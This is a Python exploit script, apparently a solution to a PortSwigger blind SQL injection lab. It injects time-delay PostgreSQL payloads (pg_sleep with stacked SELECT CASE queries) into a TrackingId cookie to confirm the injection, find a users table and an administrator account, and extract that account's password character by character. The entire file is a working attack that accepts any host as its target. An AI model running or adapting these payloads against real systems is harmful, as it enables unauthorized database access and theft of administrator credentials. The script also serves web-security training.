# lab link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={
  'http': '127.0.0.1:8080',
  'https': '127.0.0.1:8080'
}

client = None
tracking_cookie = None
host = None

def send_request(payload):
  # Set the cookie with the injection payload. No need for actual tracking cookie value
  client.cookies.set('TrackingId', f'{payload}', domain=f'{host[8:]}')

  # Make the actual request and note the time it take to receive the response
  start = time.time()
  response = client.get(f'{host}')
  end = time.time()
  request_duration = end - start

  # The indication of a successful payload is a delay in response. 
  if request_duration>5:
    return True
  return False

def confirm_injection():
  if not send_request("x'|| pg_sleep(10)--"):
    print('(-) Invalid Payload')
    sys.exit(-1)
  print('(+) Time based SQLi confirmed.')

  if not send_request("x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"):
    print('(-) Invalid Payload')
    sys.exit(-1)
  print('(+) Injection Passed. Batching through semi-colon(;) is allowed.')

  if not send_request("x'%3b+SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+'a'+END+FROM+users--"):
    print('(-) users table not found!')
    sys.exit(-1)
  print('(+) users table found.')

  if not send_request("x'%3b+SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+'a'+END+FROM+users+WHERE+username='administrator'--"):
    print('(-) username:administrator not found!')
    sys.exit(-1)
  print('(+) username:administrator found!')

def get_password_length():
  pass_length = [x for x in range(1, 100)]
  lb = 0
  ub = len(pass_length)

  while lb <= ub:
    mid = (lb+ub)//2

    if send_request(f"x'%3b+SELECT+CASE+WHEN+(LENGTH(password)={mid})+THEN+pg_sleep(10)+ELSE+'a'+END+FROM+users+WHERE+username%3d'administrator'--"):
      return mid

    elif send_request(f"x'%3b+SELECT+CASE+WHEN+(LENGTH(password)>{mid})+THEN+pg_sleep(10)+ELSE+'a'+END+FROM+users+WHERE+username%3d'administrator'--"):
      lb = mid+1

    else:
      ub = mid-1

  print('(-) Can not determine password length!')
  sys.exit(-1)

def retreive_admin_password(password_length):
  password = ''

  # ASCII positions for "lowercase alphanumeric" characters
  ascii_positions = [x for x in range(48, 58)] + [x for x in range(97, 123)]

  # Total requests to be made
  total_combinations = len(ascii_positions)*password_length
  print(f'(+) Starting password enumeration.... \nTotal requests to be sent: {total_combinations}')

  sys.stdout.write('\r[+] Current Extraction Status: ')
  sys.stdout.flush()

  req_count = 0
  for i in range(1, password_length+1):
    lb = 0
    ub = len(ascii_positions)-1

    while lb <= ub:
      req_count += 1
      
      mid_index = (lb+ub)//2
      mid_value = chr(ascii_positions[mid_index])

      if send_request(f"x'%3b+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+'a'+END+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,{i},1)='{mid_value}'--"):
        password += mid_value
        break

      elif send_request(f"x'%3b+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+'a'+END+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,{i},1)>'{mid_value}'--"):
        lb = mid_index+1

      else:
        ub = mid_index-1

    sys.stdout.write('\r[+] Current extraction status: ' + password)
    sys.stdout.flush()

    if len(password) == password_length:
      print(f'\nTotal requests made: {req_count}')
      return password
  
  print('Failed!')
  sys.exit(-1)

if __name__ == '__main__':
  try:
    host = sys.argv[1].strip().rstrip('/')

  except IndexError:
    print(f'(+) Usage: {sys.argv[0]} <HOST>')
    print(f'(+) Example: {sys.argv[0]} http://www.example.com')
    sys.exit(-1)

  with requests.Session() as client:
    client.verify = False
    client.proxies = proxies
    
    confirm_injection()

    password_length = get_password_length()
    print(f'[+] Found password length: {password_length}')

    admin_password = retreive_admin_password(password_length)
    print(f'[+] Found administrator password: {admin_password}')